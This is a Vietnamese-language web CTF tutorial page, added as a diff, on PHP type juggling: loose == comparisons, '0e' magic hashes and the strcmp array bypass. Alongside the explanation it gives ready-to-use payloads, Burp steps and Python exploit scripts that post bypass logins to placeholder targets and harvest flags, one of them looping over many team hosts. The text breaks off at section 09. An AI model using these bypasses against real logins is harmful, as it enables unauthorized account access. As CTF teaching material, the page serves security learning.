@@ -1,0 +1,556 @@
+<title>PHP Type Juggling — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Auth, Session &amp; Crypto · Đặc thù PHP</div>
+    <h1>PHP Type Juggling</h1>
+    <p class="sub">PHP tự động "ép kiểu" khi so sánh 2 giá trị khác kiểu dữ liệu (chuỗi với số, chuỗi với boolean).
+    Nếu code dùng phép so sánh "lỏng" (<code>==</code> thay vì <code>===</code>), bạn có thể lợi dụng quy tắc ép
+    kiểu kỳ lạ của PHP để qua được kiểm tra mật khẩu/token/chữ ký mà <strong>không cần biết giá trị thật</strong>.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Type Juggling là gì, để làm gì?</h2>
+  <p class="lead">PHP có 2 kiểu dấu so sánh: <code>==</code> ("lỏng" — tự ép kiểu trước khi so sánh) và
+  <code>===</code> ("chặt" — phải đúng cả giá trị lẫn kiểu dữ liệu). Khi code dùng <code>==</code> để so sánh
+  mật khẩu/token/hash, PHP sẽ tự ý "biến đổi" 2 giá trị khác kiểu để so sánh — và có những quy tắc ép kiểu rất
+  phản trực giác khiến 2 giá trị <strong>trông hoàn toàn khác nhau</strong> lại được PHP coi là <strong>bằng
+  nhau</strong>. Bạn lợi dụng điều này để qua xác thực mà không cần biết bí mật thật.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Chuỗi hash dạng <code>0e123...</code> (toàn chữ số sau <code>0e</code>) được PHP hiểu là <strong>số khoa học</strong>
+  (0 × 10^123 = 0), nên <strong>MỌI chuỗi <code>0e</code>-toàn-số khác</strong> cũng bằng 0 theo <code>==</code> —
+  2 hash hoàn toàn khác nhau nhưng cùng dạng "magic hash" này sẽ được PHP coi là bằng nhau.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ PHP TYPE JUGGLING</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Có source code PHP (BTC cấp, hoặc đọc được qua LFI/`.git` leak) dùng <code>==</code> để so sánh
+        mật khẩu/hash/token (không phải <code>===</code>, không phải <code>hash_equals()</code>, không phải
+        <code>password_verify()</code>). Đây là dấu hiệu CHẮC CHẮN NHẤT — khai thác này gần như luôn cần đọc
+        được source trước.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Đọc được source code (BTC cấp trực tiếp, hoặc qua `.git` leak/LFI — xem bài Recon và LFI).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh</span>
+        Grep trong source: <code>grep -n "==" file.php | grep -iE "pass|hash|token|secret"</code> — tìm đúng
+        dòng so sánh lỏng liên quan xác thực.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c"># 1. Magic hash (0e...) — nếu hash() so sánh với giá trị do bạn gửi</span>
+password = QNKCDZO     <span class="c"># md5("QNKCDZO") = 0e830400451993494058024219903391</span>
+password[] = anything  <span class="c"># 2. Array bypass — strcmp(array, string) trả NULL, NULL == 0 là true</span>
+
+<span class="c"># 3. Loose comparison trực tiếp (nếu biết 1 phần giá trị thật)</span>
+token = 0              <span class="c"># "0" == "abc0" (PHP cũ) hoặc "0"==0 luôn true</span></code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> re, requests
+<span class="c"># Gửi password dạng mảng thay vì chuỗi -- bypass strcmp()</span>
+html = requests.post(<span class="s">"http://TARGET/login"</span>,
+        data={<span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password[]"</span>: <span class="s">"x"</span>}).text
+<span class="k">print</span>(re.search(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>, html).group())</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Magic hash chỉ ăn nếu code so sánh đúng bằng <code>==</code> (không phải <code>===</code>). Array bypass
+        chỉ ăn với hàm cũ (<code>strcmp</code>, <code>md5</code>, <code>sha1</code> gọi trực tiếp lên mảng — PHP
+        mới némwarning nhưng code CTF hay không bắt lỗi này, vẫn tiếp tục chạy và so sánh NULL). WAF <strong>rất
+        khó</strong> chặn (xem mục 10). Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>So sánh lỏng (<code>==</code>) vs chặt (<code>===</code>)</b> — <code>==</code> cho phép PHP
+  tự "ép kiểu" (type juggling) một hoặc cả hai vế trước khi so sánh (vd chuỗi "ép" thành số). <code>===</code>
+  yêu cầu <strong>cả giá trị lẫn kiểu dữ liệu</strong> phải giống hệt, không ép kiểu gì cả.</div>
+  <div class="def"><b>Ký hiệu khoa học (scientific notation)</b> — cách viết số rất lớn/nhỏ, dạng
+  <code>0e123</code> nghĩa là <code>0 × 10^123</code> = <strong>0</strong>. PHP tự nhận ra chuỗi có đúng dạng này
+  (bắt đầu <code>0e</code>, theo sau toàn chữ số) và coi nó là kiểu số khi so sánh lỏng.</div>
+  <div class="def"><b>Magic hash</b> — các chuỗi input mà khi hash ra (MD5/SHA1) lại tình cờ có <strong>dạng
+  <code>0e</code>-toàn-số</strong>. Ví dụ nổi tiếng: <code>md5("240610708")</code> =
+  <code>0e462097431906509019562988736854</code>.</div>
+  <p>Code hay viết (xác thực bằng so sánh lỏng):</p>
+  <pre><code><span class="c">// PHP — kiểm tra mật khẩu bằng so sánh hash, dùng ==</span>
+$input_hash = md5($_POST[<span class="s">'password'</span>]);
+<span class="k">if</span> ($input_hash == $stored_hash_from_db) {
+    <span class="c">// đăng nhập thành công</span>
+}</code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>PHP "thông minh quá mức" khi so sánh khác kiểu</h2>
+  <p>PHP (đặc biệt các bản trước PHP 8) có quy tắc ép kiểu khi gặp <code>==</code> giữa chuỗi và chuỗi
+  <strong>trông giống số</strong>: nếu cả 2 chuỗi đều được PHP nhận dạng là "số dạng khoa học hợp lệ"
+  (<code>0e&lt;chỉ-toàn-chữ-số&gt;</code>), nó chuyển cả 2 sang kiểu số để so sánh — và vì
+  <code>0 × 10^bất_kỳ = 0</code>, <strong>mọi</strong> chuỗi dạng này đều "bằng" nhau khi so sánh lỏng, dù nội
+  dung chuỗi (dãy số sau <code>0e</code>) hoàn toàn khác nhau.</p>
+  <p>Tương tự, hàm <code>strcmp($a, $b)</code> (so sánh chuỗi) nếu được gọi với 1 tham số là <strong>mảng</strong>
+  (PHP &lt;8, hoặc PHP mới không bật error reporting nghiêm) sẽ trả về <code>NULL</code> thay vì ném lỗi dừng
+  chương trình — và <code>NULL == 0</code> luôn <code>true</code> trong so sánh lỏng, nên
+  <code>if (strcmp($input, $correct) == 0)</code> bị bypass hoàn toàn chỉ bằng cách gửi
+  <code>password[]=x</code> thay vì <code>password=x</code> trong form.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Theo dõi từng bước: vì sao 2 hash khác nhau lại "bằng nhau"</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 210" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:9.5px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:9.5px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:9.5px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr9)}
+    </style>
+    <defs><marker id="arr9" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="300" height="50" rx="10" class="box-a"/>
+    <text x="22" y="38" class="lbl-m">Hash lưu trong DB (của mật khẩu thật):</text>
+    <text x="22" y="54" class="lbl-a">0e462097431906509019562988736854</text>
+
+    <rect x="370" y="20" width="300" height="50" rx="10" class="box-a"/>
+    <text x="382" y="38" class="lbl-m">Hash bạn gửi (md5 của "QNKCDZO"):</text>
+    <text x="382" y="54" class="lbl-a">0e830400451993494058024219903391</text>
+
+    <path d="M160,70 V95" class="arrow"/>
+    <path d="M520,70 V95" class="arrow"/>
+    <rect x="10" y="100" width="660" height="40" rx="10" class="box"/>
+    <text x="22" y="124" class="lbl-m">PHP thấy CẢ HAI đều dạng "0e[toàn chữ số]" -&gt; ép kiểu thành SỐ KHOA HỌC</text>
+
+    <path d="M340,140 V165" class="arrow"/>
+    <rect x="200" y="170" width="280" height="35" rx="10" class="box-a"/>
+    <text x="212" y="192" class="lbl-a">0 == 0  -&gt;  TRUE  (dù 2 chuỗi gốc khác hẳn nhau!)</text>
+  </svg>
+  </div>
+  <p>Giải thích chi tiết bằng số thật:</p>
+  <div class="pbreak">
+    <div class="ph">if (md5($_POST['password']) == $stored_hash) { /* login OK */ }</div>
+    <div class="pb">
+      <div class="part">Giả sử <code>$stored_hash</code> trong database là
+      <code>0e462097431906509019562988736854</code> (đây là hash THẬT của mật khẩu, bạn không biết mật khẩu gốc).</div>
+      <div class="part">Bạn gửi password = <code>QNKCDZO</code>. PHP tính
+      <code>md5("QNKCDZO")</code> = <code>0e830400451993494058024219903391</code> — một chuỗi hoàn toàn khác,
+      NHƯNG cũng đúng dạng <code>0e</code>-toàn-số.</div>
+      <div class="part">Khi so sánh <code>==</code>, PHP thấy cả 2 vế đều "nhìn giống số khoa học hợp lệ" →
+      tự động chuyển cả 2 sang kiểu <code>float</code> trước khi so → cả 2 đều ra giá trị số <code>0</code> →
+      <code>0 == 0</code> → <code>true</code>.</div>
+    </div>
+    <div class="resp"><b>Kết quả:</b> đăng nhập thành công dù <code>QNKCDZO</code> không phải mật khẩu thật —
+    chỉ vì hash của nó TÌNH CỜ cùng dạng <code>0e</code>-toàn-số với hash thật.</div>
+  </div>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu (đọc source là bắt buộc)</h2>
+  <table>
+    <tr><th>Dấu hiệu trong source</th><th>Ý nghĩa</th></tr>
+    <tr><td><code>if ($a == $b)</code> dùng để so sánh mật khẩu/hash/token</td><td>Nghi magic hash hoặc loose comparison trực tiếp</td></tr>
+    <tr><td><code>strcmp($input, $secret) == 0</code></td><td>Nghi array bypass (gửi <code>input[]</code>)</td></tr>
+    <tr><td><code>in_array($x, $array)</code> KHÔNG có tham số thứ 3 <code>true</code></td><td><code>in_array</code> mặc định so sánh lỏng — có thể bypass tương tự</td></tr>
+    <tr><td>Hash dùng MD5/SHA1 cho mật khẩu (không phải <code>password_hash()</code>)</td><td>Dễ tính trước các magic hash tương ứng</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Bước 1-2 — bắt request login, sửa thành dạng mảng</span>
+  <ol style="margin:4px 0 0">
+    <li>Burp bắt request login bình thường, body dạng <code>username=admin&amp;password=test</code>.</li>
+    <li>Send to Repeater, sửa <code>password=test</code> thành <strong><code>password[]=test</code></strong>
+    (thêm <code>[]</code> ngay sau tên tham số).</li>
+    <li>Send, đọc Response — nếu đăng nhập thành công dù password sai hoàn toàn ⟹ array bypass xác nhận.</li>
+  </ol></div>
+  <div class="note burp"><span class="tag">Thử magic hash</span>
+  Nếu array bypass không ăn (code có validate kiểu input), thử gửi thẳng 1 trong các magic hash input đã biết
+  (mục 06) làm password — chỉ ăn nếu bạn biết/đoán được code dùng MD5 hay SHA1 để hash.</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ</div>
+  <h2>Các kiểu type juggling hay gặp</h2>
+
+  <h3>A. Magic hash — input có sẵn, tra bảng</h3>
+  <table>
+    <tr><th>Hash thuật toán</th><th>Input gửi vào (password/token)</th><th>Hash ra = "0e..."</th></tr>
+    <tr><td>MD5</td><td><code>240610708</code></td><td><code>0e462097431906509019562988736854</code></td></tr>
+    <tr><td>MD5</td><td><code>QNKCDZO</code></td><td><code>0e830400451993494058024219903391</code></td></tr>
+    <tr><td>SHA1</td><td><code>10932435112</code></td><td><code>0e07766915004133176347055865031</code></td></tr>
+  </table>
+  <div class="note tip"><span class="tag">Cách dùng</span>Nếu bạn biết <code>$stored_hash</code> trong database
+  (vd rò rỉ qua SQLi/LFI khác) và nó khớp dạng <code>0e</code>-toàn-số, chỉ cần gửi <strong>bất kỳ</strong> input
+  nào trong bảng trên (không cần đúng input gốc tạo ra đúng hash đó) — vì mọi magic hash đều "bằng" nhau theo
+  <code>==</code>.</div>
+
+  <h3>B. Array bypass — không cần biết giá trị thật</h3>
+  <table>
+    <tr><th>Hàm bị ảnh hưởng</th><th>Payload (gửi tham số dạng mảng)</th></tr>
+    <tr><td><code>strcmp($input, $correct)</code></td><td><code>password[]=anything</code></td></tr>
+    <tr><td><code>md5($input)</code> rồi so sánh</td><td><code>password[]=anything</code> → <code>md5(array)</code> trả <code>NULL</code> thay vì lỗi dừng (PHP &lt;8), <code>NULL == $stored_hash</code> chỉ đúng nếu stored_hash cũng falsy — ít gặp hơn strcmp</td></tr>
+    <tr><td><code>in_array($token, $valid_tokens)</code></td><td>Gửi giá trị <code>0</code> hoặc <code>false</code> nếu 1 trong các token hợp lệ là chuỗi không phải số thuần — <code>0 == "abc"</code> có thể true tùy phiên bản PHP</td></tr>
+  </table>
+
+  <h3>C. Loose comparison trực tiếp (khi biết 1 phần cấu trúc)</h3>
+  <table>
+    <tr><th>Tình huống</th><th>Payload</th></tr>
+    <tr><td>So sánh token dạng số với chuỗi do bạn kiểm soát 1 phần</td><td>Gửi <code>"0"</code> — nhiều chuỗi bắt đầu không phải số sẽ ép về <code>0</code> khi so <code>==</code> với số nguyên <code>0</code> (PHP &lt;8; PHP 8 đã thắt chặt một phần quy tắc này)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: TỰ TÍNH MAGIC HASH &amp; GREP SOURCE</div>
+  <h2>Không nhớ nổi bảng magic hash? Tự tính hoặc tra nhanh</h2>
+
+  <h3>A. Kho payload offline</h3>
+  <p><code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Type Juggling/</code> — có sẵn danh sách magic hash MD5/SHA1/SHA256
+  dài hơn bảng ở mục 06, dùng khi các input phổ biến không khớp.</p>
+
+  <h3>B. Grep source để tìm điểm so sánh lỏng (nếu có source)</h3>
+  <pre><code>grep -rn <span class="s">"=="</span> . | grep -iE <span class="s">"pass|hash|token|secret|auth"</span> | grep -v <span class="s">"==="</span></code></pre>
+  <p>Lọc nhanh các dòng dùng <code>==</code> (không phải <code>===</code>) liên quan xác thực — đích danh nơi
+  cần thử khai thác, không phải đoán mò toàn bộ file.</p>
+
+  <h3>C. Tự tính magic hash khi bảng có sẵn không khớp</h3>
+  <pre><code><span class="k">import</span> hashlib
+
+<span class="k">def</span> <span class="d">find_magic_hash</span>(algo=<span class="s">"md5"</span>, max_tries=2_000_000):
+    <span class="c">"""Brute-force tìm input mà hash ra dạng 0e-toàn-số (hiếm khi cần, các input mẫu mục 06 thường đủ dùng)."""</span>
+    h = <span class="k">getattr</span>(hashlib, algo)
+    <span class="k">for</span> i <span class="k">in</span> range(max_tries):
+        s = <span class="k">str</span>(i).encode()
+        digest = h(s).hexdigest()
+        <span class="k">if</span> digest[:2] == <span class="s">"0e"</span> <span class="k">and</span> digest[2:].isdigit():
+            <span class="k">print</span>(<span class="s">f"Tìm thấy: input={i} -&gt; {algo}={digest}"</span>)
+            <span class="k">return</span> i
+    <span class="k">return</span> <span class="k">None</span></code></pre>
+  <div class="note">Trong CTF thực tế hầu như luôn dùng được các input mẫu có sẵn ở mục 06/kho payload — hiếm khi
+  cần tự brute-force tìm magic hash mới.</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET/login"</span>
+
+<span class="c"># Bước 1: thử array bypass trước (ít giả định nhất)</span>
+r = requests.post(url, data={<span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password[]"</span>: <span class="s">"x"</span>})
+<span class="k">print</span>(<span class="s">"Array bypass:"</span>, <span class="s">"Welcome"</span> <span class="k">in</span> r.text)
+
+<span class="c"># Bước 2: nếu không ăn, thử magic hash</span>
+r = requests.post(url, data={<span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password"</span>: <span class="s">"QNKCDZO"</span>})
+<span class="k">print</span>(<span class="s">"Magic hash:"</span>, <span class="s">"Welcome"</span> <span class="k">in</span> r.text)</code></pre>
+
+  <h3>(B) Bản gọn chắc — thử lần lượt các kỹ thuật, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+ATTEMPTS = [
+    {<span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password[]"</span>: <span class="s">"x"</span>},               <span class="c"># array bypass</span>
+    {<span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password"</span>: <span class="s">"QNKCDZO"</span>},           <span class="c"># magic hash MD5</span>
+    {<span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password"</span>: <span class="s">"240610708"</span>},          <span class="c"># magic hash MD5 khác</span>
+]
+
+<span class="k">def</span> <span class="d">exploit_juggling</span>(host):
+    <span class="k">for</span> data <span class="k">in</span> ATTEMPTS:
+        r = requests.post(<span class="s">f"http://{host}/login"</span>, data=data, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">if</span> m:
+            <span class="k">return</span> m.group()
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_juggling(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+ATTEMPTS = [
+    {<span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password[]"</span>: <span class="s">"x"</span>},
+    {<span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password"</span>: <span class="s">"QNKCDZO"</span>},
+]
+
+<span class="k">def</span> <span class="d">exploit_juggling</span>(host):
+    <span class="k">try</span>:
+        <span class="k">for</span> data <span class="k">in</span> ATTEMPTS:
+            r = requests.post(<span class="s">f"http://{host}/login"</span>, data=data, timeout=5)
+            m = FLAG_RE.search(r.text)
+            <span class="k">if</span> m:
+                <span class="k">return</span> m.group()
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">pass</span>
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_juggling(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
